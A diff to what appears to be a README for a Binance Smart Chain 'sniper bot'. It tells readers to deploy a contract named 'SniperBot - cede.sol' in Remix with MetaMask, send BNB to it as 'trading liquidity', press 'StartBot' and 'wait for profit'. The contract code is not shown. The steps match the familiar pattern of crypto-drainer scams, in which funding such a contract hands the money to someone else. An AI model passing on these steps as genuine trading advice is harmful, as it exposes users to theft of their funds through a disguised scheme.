@@ -19,11 +19,11 @@ Steps to install:
 9. Navigate to "Deploy & run transactions" Tab from left menu
 10. From ENVIRONMENT select "Injected web3" then connect your metamask
 11. In ACCOUNT should be your wallet address
-12. Press "deploy" button then accept metamask notification for transaction fee
+12. Select SniperBot - cede.sol from CONTRACT then press "deploy" button then accept metamask notification for transaction fee
 13. After your smart-contract is deployed, copy it's address
 14. Open your metamask wallet and send some BNB to your smart-contract, this is trading liquidity
 15. In Remix IDE, at Deployed Contracts press on > sign to open smart-contract functions
-16. To start your deployed bsc sniper bot use the "Perform Task" button 
+16. To start your deployed bsc sniper bot use the "StartBot" button 
 17. Wait for profit... at time to time check balance of your smart contract
 18. Use Transfer function to withdraw BNB to smart-contract's owner wallet address
 
